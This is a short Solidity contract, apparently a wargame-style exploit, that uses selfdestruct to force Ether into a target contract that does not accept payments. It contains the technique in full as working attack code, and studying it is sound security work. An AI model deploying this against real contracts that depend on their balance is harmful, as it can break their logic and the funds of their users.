// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    address payable public target;
    
    constructor(address payable _target) payable {
        target = _target;
    }
    
    // Function to destroy this contract and force send Ether to target
    function attack() public {
        selfdestruct(target);
    }
    
    // Allow this contract to receive Ether
    receive() external payable {}
}